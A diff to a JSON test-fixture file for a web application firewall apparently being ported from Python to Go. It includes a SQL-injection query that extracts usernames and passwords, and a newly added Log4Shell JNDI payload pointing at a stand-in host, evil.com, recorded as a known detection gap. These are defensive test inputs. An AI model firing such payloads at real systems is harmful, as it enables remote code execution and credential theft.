@@ -175,7 +175,7 @@
     "query": "cat=1 union all select username,password from users--",
     "body": "",
     "ua": "sqlmap/1.7.12",
-    "client_ip": "45.33.32.156",
+    "client_ip": "45.33.32.158",
     "expect": "warn"
   },
   {
@@ -558,5 +558,24 @@
     "expect": "allow",
     "known_gap": true,
     "_gap_reason": "cve-ast-2022-42706, cve-ast-2023-37457, cve-opensips-2023-49323, cve-prosody-2022-0217, cve-strophe-2022-29168: RE2 rejects \\u0000 in patterns — these 5 patterns are skipped at compile time; a request matching ONLY these patterns passes the Go WAF"
+  },
+
+  {
+    "_comment": "=== KNOWN GAP 3: log4shell corpus missing from Go waf-rules.json ===",
+    "_comment2": "secubox-mitmproxy/data/waf-rules.json has a 'log4shell' category with jndi_lookup + jndi_ldap + nested_lookup patterns.",
+    "_comment3": "secubox-waf/config/waf-rules.json (Go corpus) is MISSING this category entirely.",
+    "_comment4": "The testdata copy mirrors the Go corpus → ${jndi:ldap://...} payloads are NOT caught by Go.",
+    "_comment5": "Python catches this at severity=critical; Go misses it silently. Must deploy complete corpus at cutover.",
+    "name": "log4shell_jndi_corpus_gap",
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "${jndi:ldap://evil.com/x}",
+    "client_ip": "203.0.113.210",
+    "expect": "allow",
+    "known_gap": true,
+    "_gap_reason": "Go corpus (secubox-waf/config/waf-rules.json) lacks the 'log4shell' category present in Python corpus (secubox-mitmproxy/data/waf-rules.json); Python catches jndi_lookup/jndi_ldap at severity=critical; Go misses it — deploy complete corpus at cutover (ref #744)",
+    "note": "Go corpus lacks log4shell category; Python catches this; deploy complete corpus at cutover"
   }
 ]
